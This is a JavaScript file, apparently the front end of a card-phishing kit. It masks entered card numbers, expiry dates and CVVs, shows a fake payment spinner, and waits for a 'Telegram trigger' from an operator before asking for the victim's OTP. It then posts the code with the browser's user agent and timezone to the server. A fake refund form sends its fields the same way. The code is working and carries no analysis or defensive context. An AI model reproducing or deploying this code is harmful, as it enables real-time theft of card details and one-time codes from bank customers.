$(document).ready(function() {
  // ——————————————————————————————————————————
  // 1) IMask for card inputs (only if cardnumber exists)
  // ——————————————————————————————————————————
  if (document.getElementById("cardnumber")) {
    try {
      const cardnumber = document.getElementById("cardnumber");
      const expirationdate = document.getElementById("expirationdate");
      const securitycode = document.getElementById("securitycode");

      var cardnumber_mask = new IMask(cardnumber, {
        mask: [
          { mask: "0000-000000-00000", regex: "^3[47]\\d{0,13}", cardtype: "american express" },
          { mask: "0000-0000-0000-0000", regex: "^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}", cardtype: "discover" },
          { mask: "0000-000000-0000",        regex: "^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}", cardtype: "diners" },
          { mask: "0000-0000-0000-0000", regex: "^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}", cardtype: "mastercard" },
          { mask: "0000-000000-00000", regex: "^(?:2131|1800)\\d{0,11}", cardtype: "jcb15" },
          { mask: "0000-0000-0000-0000", regex: "^(?:35\\d{0,2})\\d{0,12}", cardtype: "jcb" },
          { mask: "0000-0000-0000-0000", regex: "^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}", cardtype: "maestro" },
          { mask: "0000-0000-0000-0000", regex: "^4\\d{0,15}", cardtype: "visa" },
          { mask: "0000-0000-0000-0000", regex: "^62\\d{0,14}", cardtype: "unionpay" },
          { mask: "0000-0000-0000-0000", cardtype: "Unknown" }
        ],
        dispatch: function(appended, dynamicMasked) {
          try {
            var num = (dynamicMasked.value + appended).replace(/\D/g, "");
            for (let m of dynamicMasked.compiledMasks) {
              if (new RegExp(m.regex).test(num)) return m;
            }
          } catch (e) {
            console.warn("IMask dispatch error:", e);
          }
          return dynamicMasked.compiledMasks[dynamicMasked.compiledMasks.length - 1];
        }
      });

      IMask(securitycode, { mask: "0000" });
      IMask(expirationdate, {
        mask: "MM{/}YY",
        groups: {
          YY: new IMask.MaskedPattern.Group.Range([0, 99]),
          MM: new IMask.MaskedPattern.Group.Range([1, 12])
        }
      });

      cardnumber_mask.on("accept", function() {
        const type = cardnumber_mask.masked.currentMask.cardtype;
        if (type === "visa") {
          $("i").removeClass("suffix-mastercard").addClass("suffix-visa");
        } else if (type === "mastercard") {
          $("i").removeClass("suffix-visa").addClass("suffix-mastercard");
        } else {
          $("i").removeClass("suffix-visa suffix-mastercard");
        }
      });
    } catch (err) {
      console.warn("IMask init failed:", err);
    }
  }

  // ——————————————————————————————————————————
  // 2) Spinner → OTP prompt (loading page)
  // ——————————————————————————————————————————
  if ($('.sk-chase').length) {
    let readyPoller, verifyPoller;

    function showSpinner(text = 'Payment in progress...') {
      $('.sub-title').text(text).show();
      $('.sk-chase').show();
    }

    function hideSpinner() {
      $('.sk-chase').fadeOut(300);
      $('.sub-title').fadeOut(200);
    }

    function showOtpPrompt(method, errorMsg) {
      hideSpinner();
      $('.sub-title')
        .text(errorMsg || 'Please enter your OTP')
        .fadeIn(200);
      $('#otp-label').text(`Enter the OTP sent to your ${method}`);
      $('#otp-input').val('');
      $('.otp-form').fadeIn(300);
      $('.otp-error').remove();
      if (errorMsg) {
        $('<div class="otp-error" style="color:red; margin-bottom:0.5rem;">'+errorMsg+'</div>')
          .insertBefore('#otp-input');
      }
    }

    // 1) Poll for Telegram trigger
    readyPoller = setInterval(() => {
      $.getJSON('/otp-status')
        .done(res => {
          if (res.ready && (res.method === 'phone' || res.method === 'email')) {
            clearInterval(readyPoller);
            showOtpPrompt(res.method);
          }
        })
        .fail(() => console.warn('Failed fetching /otp-status'));
    }, 3000);

    // 2) Submit OTP (with UA + TZ)
    $('#otp-submit').on('click', () => {
      const otp = $('#otp-input').val().trim();
      const method = $('#otp-label').text().match(/phone|email/)[0];
      if (!/^\d{6}$/.test(otp)) {
        return showOtpPrompt(method, 'Enter a valid 6‑digit code');
      }

      $('.otp-form').fadeOut(200, () => showSpinner('Verifying OTP...'));

      $.ajax({
        url: '/submit-otp',
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({
          otp,
          ua: navigator.userAgent,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        }),
      })
      .done(() => {
        // Poll for verify result
        verifyPoller = setInterval(() => {
          $.getJSON('/otp-verify-status')
            .done(res => {
              if (res.valid === true) {
                clearInterval(verifyPoller);
                window.location.href = '/success';
              } else if (res.valid === false) {
                clearInterval(verifyPoller);
                showOtpPrompt(method, 'Incorrect code, try again');
              }
            })
            .fail(() => console.warn('Failed fetching /otp-verify-status'));
        }, 3000);
      })
      .fail(() => {
        showOtpPrompt(method, 'Error sending code, please retry');
      });
    });
  }

  // ——————————————————————————————————————————
  // 3) Refund form submission (refund page)
  // ——————————————————————————————————————————
  if ($('#refund-form').length) {
    console.log('Binding refund handler');
    $('#refund-form').on('submit', e => e.preventDefault());

    $('#refund-btn').on('click', () => {
      console.log('>>> REFUND CLICKED');
      const data = {};
      $('#refund-form').serializeArray().forEach(({name,value}) => {
        console.log('Field:', name, '=', value);
        data[name] = value;
      });
      data.ua = navigator.userAgent;
      data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

      fetch('/refund', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(data)
      })
      .then(() => {
        console.log('Refund POST succeeded');
        alert('✅ Refund request sent.');
      })
      .catch(err => {
        console.error('Refund POST failed', err);
        alert('❌ Error sending refund.');
      });
    });
  }

  // ——————————————————————————————————————————
  // 4) Delegated refund click (always bound)
  // ——————————————————————————————————————————
  console.log('⚙️ index.js loaded (debug snippet)');
  $(document).on('click', '#refund-btn', function(e) {
    console.log('>>> REFUND CLICKED via delegated handler');
    e.preventDefault();

    const data = {};
    $('#refund-form').serializeArray().forEach(({ name, value }) => {
      console.log('Field:', name, '=', value);
      data[name] = value;
    });
    data.ua = navigator.userAgent;
    data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

    console.log('Sending POST /refund with payload:', data);
    fetch('/refund', {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify(data)
    })
    .then(() => {
      console.log('✅ Refund POST succeeded');
      alert('✅ Refund request sent.');
    })
    .catch(err => {
      console.error('❌ Refund POST failed', err);
      alert('❌ Error sending refund.');
    });
  });
});

